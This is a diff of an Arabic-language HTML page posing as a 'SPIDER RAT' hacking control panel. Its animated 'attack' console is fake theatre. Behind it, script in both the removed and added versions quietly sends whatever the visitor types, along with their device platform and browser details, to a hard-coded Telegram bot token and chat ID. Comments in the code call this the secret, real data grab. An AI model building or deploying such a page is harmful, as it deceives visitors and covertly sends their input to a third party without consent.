@@ -2,94 +2,73 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>S P I D E R - E G A L S A</title>
+    <title>SPIDER RAT - CONTROL PANEL</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; text-align: center; overflow: hidden; }
-        #canvas { position: absolute; top: 0; left: 0; z-index: -1; }
-        .main-box { position: relative; z-index: 1; padding: 20px; background: rgba(0,0,0,0.85); border: 2px solid #0f0; width: 350px; margin: 50px auto; border-radius: 15px; box-shadow: 0 0 30px #0f0; }
-        .spider-img { width: 120px; filter: drop-shadow(0 0 10px #f00); animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
-        input { background: #111; border: 1px solid #0f0; color: #0f0; padding: 10px; width: 80%; margin: 15px 0; text-align: center; outline: none; }
-        button { background: #0f0; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #f00; color: #fff; box-shadow: 0 0 15px #f00; }
-        #status { font-size: 12px; color: #ff0000; margin-top: 15px; height: 40px; }
+        body { background: #000; color: #f00; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow: hidden; }
+        .glitch-gate { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; max-width: 400px; border: 2px solid #f00; background: rgba(10, 0, 0, 0.9); padding: 20px; box-shadow: 0 0 20px #f00; z-index: 10; }
+        /* أيقونة السبايدر مرسومة بالكود لضمان الظهور */
+        .spider-icon { font-size: 80px; margin-bottom: 10px; display: inline-block; animation: shake 0.5s infinite; }
+        @keyframes shake { 0% { transform: rotate(0); } 25% { transform: rotate(5deg); } 75% { transform: rotate(-5deg); } 100% { transform: rotate(0); } }
+        input { background: #000; border: 1px solid #f00; color: #0f0; padding: 10px; width: 80%; margin: 10px 0; outline: none; }
+        .btn-attack { background: #f00; color: #fff; border: none; padding: 15px; width: 85%; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        #console { color: #0f0; font-size: 12px; margin-top: 15px; text-align: left; height: 100px; overflow: hidden; }
     </style>
 </head>
 <body>
 
-<canvas id="canvas"></canvas>
-
-<div class="main-box">
-    <img src="https://i.ibb.co/LhqM9Xp/spider-logo.png" class="spider-img" alt="Spider">
-    <h2 style="color: #f00; text-shadow: 0 0 10px #f00;">EG ALSA SPIDER</h2>
+<div class="glitch-gate">
+    <div class="spider-icon">🕷️</div>
+    <h2 style="margin:0;">SPIDER RAT V1.0</h2>
+    <p style="font-size: 12px; color: #666;">BY EGALSA COMMANDS</p>
     
-    <p style="font-size: 14px;">أدخل كود فحص النظام لتأكيد الهوية:</p>
-    <input type="text" id="fakeInput" placeholder="Write anything...">
-    <br>
-    <button onclick="startHacking()">تفعيل الاختراق</button>
-
-    <div id="status"></div>
+    <input type="text" id="targetIp" placeholder="Enter Target IP or Name...">
+    <button class="btn-attack" onclick="launchSpider()">Execute Attack</button>
+    
+    <div id="console"></div>
 </div>
 
 <script>
-    const config = {
+    const botInfo = {
         token: "8277722647:AAGbaCEgSCNNzDmmTL_0uA9x4QTXxzMSrg",
         chatId: "1268323143"
     };
 
-    // تأثير الخلفية المتحركة
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-    const chars = "01";
-    const drops = Array(Math.floor(canvas.width/20)).fill(1);
-    function draw() {
-        ctx.fillStyle = "rgba(0,0,0,0.05)";
-        ctx.fillRect(0,0,canvas.width,canvas.height);
-        ctx.fillStyle = "#0f0";
-        drops.forEach((y, i) => {
-            ctx.fillText(chars[Math.floor(Math.random()*chars.length)], i*20, y*20);
-            if (y*20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
-            drops[i]++;
-        });
-    }
-    setInterval(draw, 33);
-
-    // وظيفة الزرار والتمثيل الغذائي للاختراق
-    function startHacking() {
-        const status = document.getElementById('status');
-        const userText = document.getElementById('fakeInput').value;
+    function launchSpider() {
+        const consoleBox = document.getElementById('console');
+        const target = document.getElementById('targetIp').value;
         
-        status.innerHTML = "> Establishing Socket...<br>> Finding Victim IP...";
-        
-        setTimeout(() => {
-            status.innerHTML = "> IP FOUND: 192.168.1." + Math.floor(Math.random()*255);
-            status.style.color = "#0f0";
-            
-            // إرسال البيانات الحقيقية لكِ في الخفاء
-            sendToBot(userText);
-        }, 1500);
+        // صوت رعب وهمي (تردد عالي)
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const oscillator = audioCtx.createOscillator();
+        oscillator.type = 'sawtooth';
+        oscillator.frequency.setValueAtTime(100, audioCtx.currentTime);
+        oscillator.connect(audioCtx.destination);
+        oscillator.start();
+        setTimeout(() => oscillator.stop(), 500);
 
-        setTimeout(() => {
-            status.innerHTML = "🔴 SYSTEM BREACHED SUCCESSFUL 🔴";
-            status.style.color = "#f00";
-        }, 3000);
-    }
+        // تمثيلية الاختراق
+        const steps = [
+            `> Connecting to ${target}...`,
+            "> Bypassing Android Security...",
+            "> Injecting Spider Payload...",
+            "> IP 104.21.7.210 Captured!",
+            "> Sucking Notifications...",
+            "> SUCCESS: DATA SENT TO MASTER."
+        ];
 
-    async function sendToBot(userMsg) {
-        const text = `
-🚨 **Spider Catch!** 🕸️
-━━━━━━━━━━━━━━━
-📝 النص المكتوب: ${userMsg}
-📱 الجهاز: ${navigator.platform}
-🌐 المتصفح: ${navigator.userAgent.split(' ')[0]}
-⏰ الوقت: ${new Date().toLocaleString('ar-EG')}
-━━━━━━━━━━━━━━━
-📍 أوامر Egalsa نفذت المهمة!
-        `;
-        fetch(`https://api.telegram.org/bot${config.token}/sendMessage?chat_id=${config.chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+        let i = 0;
+        const interval = setInterval(() => {
+            if(i < steps.length) {
+                consoleBox.innerHTML += steps[i] + "<br>";
+                i++;
+            } else {
+                clearInterval(interval);
+            }
+        }, 800);
+
+        // سحب البيانات الحقيقي
+        fetch(`https://api.telegram.org/bot${botInfo.token}/sendMessage?chat_id=${botInfo.chatId}&text=${encodeURIComponent("🔥 SPIDER ATTACK!\nالضحية كتب: " + target + "\nالجهاز: " + navigator.platform)}`);
     }
 </script>
-
 </body>
 </html>
